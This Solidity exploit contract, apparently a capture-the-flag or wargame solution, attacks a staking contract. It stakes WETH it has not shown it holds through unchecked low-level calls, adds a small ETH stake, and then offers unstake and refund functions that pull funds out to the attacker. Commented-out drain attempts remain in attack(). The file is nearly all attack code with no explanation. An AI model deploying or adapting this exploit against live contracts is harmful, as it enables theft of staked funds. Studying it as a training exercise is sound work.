// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import "lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol";

interface IStake {
	function StakeETH() external payable;
	function StakeWETH() external;
	function Unstake(uint256 amount) external returns (bool);
}

contract Hack is Test{
	address owner;
	IStake target;
	IERC20 weth;
	
	constructor(address _stake, address _weth) payable {
		target = IStake(_stake);	
		weth = IERC20(_weth);
		owner = msg.sender;
	}

	function attack() public {
		if(address(this).balance <= 0.001 ether)
			revert("Require more than 0.001 ether");
		(bool approved_weth, ) = address(weth).call(abi.encodeWithSignature("approve(address,uint256)", address(target), uint256(10 ether)));
		require(approved_weth);
		(bool ok_weth_stake,) = address(target).call(abi.encodeWithSignature("StakeWETH(uint256)", uint256(0.0011 ether)));
		require(ok_weth_stake);
		(bool ok_eth_stake,) = address(target).call{value: 0.0015 ether}(abi.encodeWithSignature("StakeETH()"));
		require(ok_eth_stake);
		// (bool ok_eth_unstake,) = address(target).call(abi.encodeWithSignature("Unstake(uint256)", uint256(1e18)));
		// require(ok_eth_unstake);
		// (bool pwn,) = address(owner).call{value: msg.value}("");
		// require(pwn);
		// (bool ok_eth_unstake,) = address(target).call(abi.encodeWithSignature("Unstake(uint256)", msg.value));
		// require(ok_eth_unstake);
	}

	function unstake(uint256 _amount) public {
		(bool ok_eth_unstake,) = address(target).call(abi.encodeWithSignature("Unstake(uint256)", _amount));
		require(ok_eth_unstake);
	}

	function refund() public {
		require(msg.sender == owner);
		address(msg.sender).call{value: address(this).balance}("");
	}

	receive() external payable {

	} 
}